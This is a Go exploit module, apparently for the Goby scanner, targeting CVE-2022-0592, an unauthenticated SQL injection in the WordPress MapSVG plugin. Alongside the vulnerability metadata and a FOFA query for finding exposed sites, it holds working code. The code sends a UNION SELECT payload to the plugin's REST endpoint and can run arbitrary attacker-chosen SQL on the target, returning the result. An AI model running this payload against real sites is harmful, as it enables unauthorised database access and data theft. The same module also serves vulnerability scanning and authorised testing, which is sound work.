package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Wordpress MapSVG plugin id parameter SQL injection vulnerability (CVE-2022-0592)",
    "Description": "<p>MapSVG is a WordPress plugin that allows you to display custom content on Google, Vector or image maps.</p><p>WordPress plugin MapSVG versions prior to 6.2.20 have a SQL injection vulnerability. This vulnerability is caused by not validating or escaping SQL statements before constructing them using data transmitted through the REST endpoint. An unauthenticated attacker can exploit this vulnerability. SQL injection attacks.</p>",
    "Product": "WordPress-MapSVG",
    "Homepage": "https://mapsvg.com/",
    "DisclosureDate": "2022-05-09",
    "Author": "2075068490@qq.com",
    "FofaQuery": "body=\"/wp-content/plugins/mapsvg/\" || body=\"mapsvg_paths\" || body=\"mapsvg_options\" || body=\"mapsvg-region-label\"",
    "GobyQuery": "body=\"/wp-content/plugins/mapsvg/\" || body=\"mapsvg_paths\" || body=\"mapsvg_options\" || body=\"mapsvg-region-label\"",
    "Level": "3",
    "Impact": "<p>WordPress plugin MapSVG versions prior to 6.2.20 have a SQL injection vulnerability. This vulnerability is caused by not validating or escaping SQL statements before constructing them using data transmitted through the REST endpoint. An unauthenticated attacker can exploit this vulnerability. SQL injection attacks.</p>",
    "Recommendation": "<p>The manufacturer has released a solution, please upgrade to 6.2.20 or above version:<a href=\"https://mapsvg.com/\">https://mapsvg.com/</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/5d8d53ad-dc88-4b50-a292-fc447484c27b"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "md5(123)",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-0592"
    ],
    "CNNVD": [
        "CNNVD-202205-2709"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Wordpress MapSVG 插件 id 参数 SQL 注入漏洞 ( CVE-2022-0592）",
            "Product": "WordPress-MapSVG",
            "Description": "<p>MapSVG 是一个 Wordpress 插件，MapSVG 可以在 Google，Vector 或图像地图上显示的自定义内容。</p><p>WordPress plugin MapSVG 6.2.20 之前版本存在SQL注入漏洞，该漏洞源于在使用通过 REST 端点传输的数据构造 SQL 语句之前不会其进行验证或转义，未经身份验证的攻击者可以利用该漏洞实现 SQL 注入攻击。</p>",
            "Recommendation": "<p>厂商已发布解决方案，请升级到 6.2.20 或以上版本：<a href=\"https://mapsvg.com/\" target=\"_blank\">https://mapsvg.com/</a><br></p>",
            "Impact": "<p>WordPress plugin MapSVG 6.2.20 之前版本存在SQL注入漏洞，该漏洞源于在使用通过 REST 端点传输的数据构造 SQL 语句之前不会其进行验证或转义，未经身份验证的攻击者可以利用该漏洞实现 SQL 注入攻击。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Wordpress MapSVG plugin id parameter SQL injection vulnerability (CVE-2022-0592)",
            "Product": "WordPress-MapSVG",
            "Description": "<p>MapSVG is a WordPress plugin that allows you to display custom content on Google, Vector or image maps.</p><p>WordPress plugin MapSVG versions prior to 6.2.20 have a SQL injection vulnerability. This vulnerability is caused by not validating or escaping SQL statements before constructing them using data transmitted through the REST endpoint. An unauthenticated attacker can exploit this vulnerability. SQL injection attacks.</p>",
            "Recommendation": "<p>The manufacturer has released a solution, please upgrade to 6.2.20 or above version:<a href=\"https://mapsvg.com/\">https://mapsvg.com/</a><br></p>",
            "Impact": "<p>WordPress plugin MapSVG versions prior to 6.2.20 have a SQL injection vulnerability. This vulnerability is caused by not validating or escaping SQL statements before constructing them using data transmitted through the REST endpoint. An unauthenticated attacker can exploit this vulnerability. SQL injection attacks.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-12-14",
    "PocId": "10896"
}`

	sendPayloadRequest32hasg3 := func(hostInfo *httpclient.FixUrl, sql string) (string, error) {
		payload := "-5222' UNION ALL SELECT 11,22,33,44,55,66,(" + sql + "),88 "
		payloadRequestConfig := httpclient.NewGetRequestConfig(`/wp-json/mapsvg/v1/maps/2?id=` + url.QueryEscape(payload) + "--+")
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.VerifyTls = false
		matchRegexp := regexp.MustCompile(`"status":"([^"]+)"`)
		resp, err := httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
		if resp != nil && resp.StatusCode == 200 && len(matchRegexp.FindStringSubmatch(resp.Utf8Html)) > 1 {
			return matchRegexp.FindStringSubmatch(resp.Utf8Html)[1], nil
		} else if err != nil {
			return "", err
		}
		return "", errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			h := md5.New()
			h.Write([]byte(checkStr))
			result, _ := sendPayloadRequest32hasg3(hostInfo, `md5('`+checkStr+`')`)
			return strings.Contains(result, hex.EncodeToString(h.Sum(nil)))
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sql" {
				if result, err := sendPayloadRequest32hasg3(expResult.HostInfo, goutils.B2S(ss.Params["sql"])); len(result) > 1 {
					expResult.Success = true
					expResult.Output = result
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "sqlPoint" {
				checkStr := goutils.RandomHexString(16)
				h := md5.New()
				h.Write([]byte(checkStr))
				if result, err := sendPayloadRequest32hasg3(expResult.HostInfo, `md5('`+checkStr+`')`); strings.Contains(result, hex.EncodeToString(h.Sum(nil))) {
					expResult.Success = true
					expResult.Output = "GET /wp-json/mapsvg/v1/maps/2?id=-5222%27%20UNION%20ALL%20SELECT%2011,22,33,44,55,66,md5(" + checkStr + "),88%20--+ HTTP/1.1\n" +
						"Host:" + expResult.HostInfo.String() + "\n" +
						"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\n" +
						"Connection: close"
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
